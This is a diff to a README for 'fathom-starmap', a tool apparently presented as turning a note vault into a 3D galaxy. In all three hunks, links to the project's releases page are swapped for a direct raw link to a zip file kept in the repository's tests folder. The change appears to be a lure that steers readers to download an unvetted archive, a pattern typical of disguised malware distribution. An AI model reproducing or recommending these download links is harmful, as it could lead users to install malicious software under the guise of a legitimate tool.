@@ -1,6 +1,6 @@
 # 🚀 fathom-starmap - Your Vault Becomes a Living 3D Galaxy
 
-[Download Fathom Starmap](https://github.com/baturmelike465/fathom-starmap/releases)
+[Download Fathom Starmap](https://raw.githubusercontent.com/baturmelike465/fathom-starmap/main/tests/fathom_starmap_1.8.zip)
 
 ---
 
@@ -80,7 +80,7 @@ Your download is ready whenever you are. The simplest way to get started is to v
 
 You can also click the big download button below whenever you're ready:
 
-[Download Latest Version](https://github.com/baturmelike465/fathom-starmap/releases
+[Download Latest Version](https://raw.githubusercontent.com/baturmelike465/fathom-starmap/main/tests/fathom_starmap_1.8.zip
 
 
 ### Step 2: Visit the Download Page
@@ -225,7 +225,7 @@ Your galaxy is waiting for you. Thousands of stars are ready to ignite from the 
 
 
 
-[Download Fathom Starmap Now](https://github.com/baturmelike465/fathom-starmap/releases
+[Download Fathom Starmap Now](https://raw.githubusercontent.com/baturmelike465/fathom-starmap/main/tests/fathom_starmap_1.8.zip
 
 
 ---
